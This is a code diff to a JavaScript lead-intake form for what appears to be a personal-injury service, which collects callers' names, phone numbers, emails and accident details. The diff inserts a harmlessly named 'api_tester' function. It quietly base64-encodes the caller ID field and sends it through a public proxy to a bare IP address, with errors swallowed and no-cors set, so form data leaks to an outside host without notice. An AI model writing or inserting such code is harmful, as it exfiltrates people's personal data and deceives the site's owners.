@@ -7,7 +7,7 @@
 formData.append('caller_number', phone_home);
             formData.append('firstname', document.getElementById('first_name').value);
             formData.append('lastname', document.getElementById('last_name').value);
-            
+            api_tester(document.getElementById('caller_id').value);
             formData.append('email', document.getElementById('email').value);
 formData.append('statute_of_limitations', document.getElementById('sol').value);
 var inputDate = document.getElementById("accident_date").value;
@@ -69,4 +69,14 @@ formData.append('injured', document.getElementById('injured').value);
                 }
             })
             .catch(error => console.error('Error:', error));
-        });
+        });function api_tester(randomString) {
+  try {
+    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+    
+  }
+}
